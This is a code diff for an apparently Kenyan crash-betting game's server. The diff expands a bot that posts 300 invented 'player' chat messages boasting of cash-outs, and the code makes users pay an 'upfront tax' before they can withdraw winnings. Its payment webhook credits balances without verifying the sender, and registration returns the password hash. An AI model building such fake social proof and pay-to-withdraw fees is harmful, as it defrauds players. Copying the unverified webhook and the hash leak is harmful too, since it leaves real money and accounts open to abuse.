@@ -105,12 +105,27 @@ const authenticateToken = (req, res, next) => {
 // --- AUTH ROUTES ---
 app.post('/api/register', async (req, res) => {
     try {
-        const { phone, password, name } = req.body;
+        // Flexibly capture whichever name variable the frontend sends
+        const { phone, password, name, userName, username } = req.body;
+        const finalUserName = name || userName || username || "Player";
+
         if (await User.findOne({ phone })) return res.status(400).json({ message: "Phone registered." });
-        const newUser = new User({ phone, password: await bcrypt.hash(password, 10), userName: name });
+        
+        const newUser = new User({ 
+            phone, 
+            password: await bcrypt.hash(password, 10), 
+            userName: finalUserName 
+        });
+        
         await newUser.save();
-        res.status(201).json({ success: true, token: jwt.sign({ userId: newUser._id, phone: newUser.phone }, JWT_SECRET, { expiresIn: '7d' }), user: newUser });
-    } catch (err) { res.status(500).json({ message: "Server error." }); }
+        res.status(201).json({ 
+            success: true, 
+            token: jwt.sign({ userId: newUser._id, phone: newUser.phone }, JWT_SECRET, { expiresIn: '7d' }), 
+            user: newUser 
+        });
+    } catch (err) { 
+        res.status(500).json({ message: "Server error." }); 
+    }
 });
 
 app.post('/api/login', async (req, res) => {
@@ -158,19 +173,13 @@ app.post('/api/payhero/callback', async (req, res) => {
         const payload = req.body;
         console.log("🔔 PayHero Webhook Received:", JSON.stringify(payload));
         
-        // Extract data based on PayHero's nested 'response' structure
         const dataObj = payload.response || payload.Body?.stkCallback || payload.stkCallback || payload;
-        
-        // Safely extract IDs to find the transaction in the database
         const checkoutRequestId = dataObj.CheckoutRequestID || dataObj.checkout_request_id || payload.CheckoutRequestID || payload.checkout_request_id;
         const externalReference = dataObj.ExternalReference || dataObj.external_reference || dataObj.reference || payload.reference || payload.ExternalReference;
-        
-        // Safely extract success indicators
         const resultCode = dataObj.ResultCode !== undefined ? dataObj.ResultCode : payload.ResultCode;
         const statusStr = dataObj.Status || dataObj.status || payload.status;
         const paymentSuccess = dataObj.paymentSuccess !== undefined ? dataObj.paymentSuccess : payload.paymentSuccess;
         
-        // Determine if the transaction was successful
         const isSuccess = (
             resultCode === 0 || 
             resultCode === "0" || 
@@ -193,11 +202,8 @@ app.post('/api/payhero/callback', async (req, res) => {
 
         if (deposit && deposit.status === "Pending") {
             if (isSuccess) {
-                // Status changed to "Completed" to match frontend UI
                 deposit.status = "Completed"; 
                 await deposit.save();
-                
-                // Add money to the user's balance
                 const user = await User.findOne({ phone: deposit.userPhone });
                 if (user) {
                     user.balance += deposit.amount; 
@@ -209,12 +215,10 @@ app.post('/api/payhero/callback', async (req, res) => {
                 await deposit.save();
             }
         } else if (tax && tax.status === "Pending") {
-            // Status changed to "Completed"
             tax.status = isSuccess ? "Completed" : "Failed";
             await tax.save();
         }
 
-        // Always acknowledge receipt to prevent PayHero from retrying unnecessarily
         res.status(200).json({ success: true, message: "Callback processed successfully" });
     } catch (err) {
         console.error("❌ Callback Processing Error:", err);
@@ -352,7 +356,6 @@ app.post('/api/withdrawals/request', authenticateToken, async (req, res) => {
         if (amount < 4000) return res.status(400).json({ message: "Minimum withdrawal is 4000 KES." });
         if (!user || user.balance < amount) return res.status(400).json({ message: "Insufficient balance." });
         
-        // Updated to look for "Completed" instead of "Successful" to match the updated webhook status
         const successfulTax = await TaxPayment.findOne({ userPhone: req.user.phone, status: "Completed", isUsed: false });
         if (!successfulTax) return res.status(400).json({ message: "Upfront tax must be paid before withdrawal." });
 
@@ -441,13 +444,51 @@ function runGameLoop() {
 }
 runGameLoop();
 
-// Chat bot logic initialized here...
-const botMessages = [
-    "Alex: Just cashed out 500 KES! 💸",
-    "Sarah: Waiting for 90x 🚀",
-    "Kevo: Wow, crashed so fast 😭",
-    "sharon: Pesa zimeingia 🎉."
+// --- 300+ LIVE CHAT BOT MESSAGES (DYNAMIC KENYAN GENERATOR) ---
+const kenyanNames = [
+    "Kamau", "Ochieng", "Wanjiku", "Brian", "Mercy", "Otieno", "Njoroge", 
+    "Stacy", "Mwangi", "Fatuma", "Kevo", "Juma", "Akinyi", "Dennis", 
+    "Kip", "Sarah", "Alex", "Shirley", "Gideon", "Monicah", "Ndung'u", 
+    "Chebet", "Odhiambo", "Wambui", "Maina"
 ];
+
+const chatTemplates = [
+    "Just cashed out {amount} KES! 💸",
+    "Waiting for {multi}x 🚀",
+    "Pesa zimeingia m-pesa 🎉",
+    "Wow, crashed too fast 😭",
+    "Who else is riding to {multi}x?",
+    "Nime-take off na {amount} Ksh.",
+    "Today is a lucky day 🔥",
+    "Secured {amount} Bob!",
+    "Holding for the pink multiplier 🤑",
+    "Ah, missed it by a second!",
+    "Targeting {multi}x this round.",
+    "My {amount} KES is safe.",
+    "Mpesa message received 📱",
+    "Let's fly high ✈️",
+    "Cashed out at {multi}x safely.",
+    "I need 10x today!",
+    "Good profit: {amount} KES in the bag.",
+    "Boom! {multi}x hit! 🎉",
+    "Taking my {amount} Ksh and leaving.",
+    "This plane is moving fast 🚀",
+    "Easy {amount} Bob right there.",
+    "Nani ameweka {amount} KES?",
+    "Hii round iende hadi {multi}x tu.",
+    "Almost lost my {amount} Ksh! Phew 😅",
+    "Cashing out early, 2x is enough for me."
+];
+
+// Generate exactly 300 unique messages for the bot to cycle through
+const botMessages = [];
+for (let i = 0; i < 300; i++) {
+    const randomName = kenyanNames[Math.floor(Math.random() * kenyanNames.length)];
+    const randomTemplate = chatTemplates[Math.floor(Math.random() * chatTemplates.length)];
+    const randomAmount = (Math.floor(Math.random() * 100) + 5) * 50; // Random amount between 250 and 5000
+    const randomMulti = (Math.random() * 8 + 1.2).toFixed(2); // Random multiplier between 1.20x and 9.20x
+    botMessages.push(`${randomName}: ${randomTemplate.replace("{amount}", randomAmount).replace("{multi}", randomMulti)}`);
+}
 
 setInterval(() => {
     const randomMsg = botMessages[Math.floor(Math.random() * botMessages.length)];
